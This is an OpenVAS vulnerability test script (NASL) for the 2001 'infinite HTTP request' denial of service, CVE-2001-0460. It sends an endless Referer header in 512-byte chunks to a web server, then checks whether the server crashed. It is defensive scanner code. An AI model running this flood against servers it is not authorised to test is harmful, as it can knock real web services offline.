# OpenVAS Vulnerability Test
# $Id: www_infinite_request_DoS.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: Infinite HTTP request
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "It was possible to kill the web server by
sending an invalid 'infinite' HTTP request that never ends.

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbirtray code on your system.";

tag_solution = "upgrade your software or protect it with a filtering reverse proxy";

# References:
# Date:  Thu, 8 Mar 2001 15:04:20 +0100
# From: "Peter_Gründl" <peter.grundl@DEFCOM.COM>
# Subject: def-2001-10: Websweeper Infinite HTTP Request DoS
# To: BUGTRAQ@SECURITYFOCUS.COM
#
# Affected:
# WebSweeper 4.0 for Windows NT

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.11084");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(2465);
 script_cve_id("CVE-2001-0460");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"qod_type", value:"remote_banner_unreliable");
 script_name("Infinite HTTP request");
 
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 script_family("Denial of Service");
 script_require_ports("Services/www", 80);
 script_dependencies("gb_get_http_banner.nasl", "httpver.nasl");
 script_mandatory_keys("+WN/banner");
 script_exclude_keys("www/vnc");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

########

include("http_func.inc");
include('global_settings.inc');


port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);

banner = get_http_banner(port:port);
# WN waits for 30 s before sending back a 408 code
if (egrep(pattern:"Server: +WN/2\.4\.", string:banner)) exit(0);

if (http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

crap512 = crap(512);
r= http_get(item: '/', port:port);
r= r - '\r\n\r\n';
r= strcat(r, '\r\nReferer: ', crap512);

send(socket:soc, data: r);
cnt = 0;

while (send(socket: soc, data: crap512) > 0) { 
	cnt = cnt+512;
	if(cnt > 524288) {
		r = recv(socket: soc, length: 13, timeout: 2);
		http_close_socket(soc);
		if (r)
		{
			debug_print('r=', r);
			exit(0);
		}
		if(http_is_dead(port:port)) {
			log_print('Infinite request killed the web server on port ', port, ' after ', cnt, ' bytes\n');
			security_message(port);
			exit(0);
		}

		m = "
Your web server seems to accept unlimited requests.
It may be vulnerable to the 'WWW infinite request' attack, which
allows a cracker to consume all available memory on your system.

*** Note that OpenVAS was unable to crash the web server
*** so this might be a false alert.

Solution: upgrade your software or protect it with a filtering reverse proxy";
		security_message(port: port, data: m); 
                exit(0);
	}
}

debug_print(level: 2, 'port=', port, ', CNT=', cnt, '\n');
# Keep the socket open, in case the web server itself is saturated

if(http_is_dead(port: port)) security_message(port); 

http_close_socket(soc);

